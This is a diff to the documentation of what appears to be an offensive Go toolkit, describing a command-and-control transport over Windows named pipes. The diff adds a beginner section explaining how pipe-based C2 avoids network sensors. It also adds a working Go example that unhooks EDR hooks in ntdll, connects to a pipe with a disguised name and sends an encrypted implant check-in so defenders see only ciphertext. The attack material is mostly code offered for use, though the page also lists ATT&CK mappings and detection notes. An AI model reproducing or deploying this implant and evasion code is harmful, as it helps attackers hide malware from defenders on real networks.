@@ -7,6 +7,12 @@
 | Platform | Windows |
 | Detection | Medium |
 
+## For Beginners
+
+Most C2 traffic leaves the host over TCP or HTTP, which firewalls and network sensors inspect closely. Windows named pipes are an on-host IPC channel that Windows services use constantly, so traffic between two local processes over a pipe looks identical to normal OS activity.
+
+An implant can beacon to a local relay (or to another session over SMB) through a named pipe without ever touching a network socket that a perimeter IDS can see.
+
 ## What It Does
 
 Provides a C2 transport over Windows named pipes, implementing both client (`transport.Transport`) and server (`transport.Listener`) interfaces. Named pipes are a native IPC mechanism used extensively by Windows services, making pipe-based C2 traffic blend with legitimate OS activity.
@@ -77,6 +83,61 @@ mc := multicat.New(cfg)
 mc.Connect(ctx)
 ```
 
+---
+
+## Combined Example
+
+Beacon over a named pipe with an AES-GCM-encrypted payload, after patching
+ntdll to remove vendor hooks that would otherwise log the pipe syscalls.
+
+```go
+package main
+
+import (
+    "context"
+    "time"
+
+    "github.com/oioio-space/maldev/c2/transport/namedpipe"
+    "github.com/oioio-space/maldev/crypto"
+    "github.com/oioio-space/maldev/evasion/unhook"
+)
+
+func main() {
+    ctx := context.Background()
+
+    // 1. Remove EDR inline hooks on common ntdll exports first. Any later
+    //    call into NtCreateFile / NtWriteFile for the pipe transport will
+    //    reach the real kernel stub instead of the vendor detour.
+    for _, t := range unhook.CommonClassic() {
+        _ = t.Apply(nil)
+    }
+
+    // 2. Dial the local pipe. To a network sensor this is invisible — no
+    //    packets leave the host; to a process-tree view it's just IPC.
+    p := namedpipe.New(`\\.\pipe\spoolv4`, 5*time.Second)
+    if err := p.Connect(ctx); err != nil {
+        return
+    }
+    defer p.Close()
+
+    // 3. Encrypt the beacon with AES-GCM so a defender who tees the pipe
+    //    (debugger, minifilter, Sysmon pipe-content rule) sees ciphertext.
+    key, _ := crypto.NewAESKey()
+    beacon := []byte(`{"id":"agent-01","cmd":"checkin"}`)
+    ct, _ := crypto.EncryptAESGCM(key, beacon)
+    _, _ = p.Write(ct)
+
+    // Response side (mirror): p.Read → crypto.DecryptAESGCM(key, buf[:n]).
+}
+```
+
+Layered benefit: unhooking restores clean syscall stubs so nothing in the
+pipe I/O path feeds a vendor sensor; the named-pipe transport keeps traffic
+on-host and looks like ordinary IPC; AES-GCM turns any captured pipe bytes
+into opaque, integrity-protected ciphertext.
+
+---
+
 ## MITRE ATT&CK
 
 | Tactic | Technique | ID |
@@ -95,3 +156,9 @@ mc.Connect(ctx)
 | Handle inspection | Process handle enumeration reveals open pipe handles |
 
 **Rating: Medium** -- Named pipes are heavily used by legitimate Windows services, making detection reliant on pipe name heuristics and behavioral analysis rather than simple signature matching.
+
+---
+
+## API Reference
+
+See [c2.md](../../c2.md#c2transportnamedpipe----windows-named-pipe-transport)
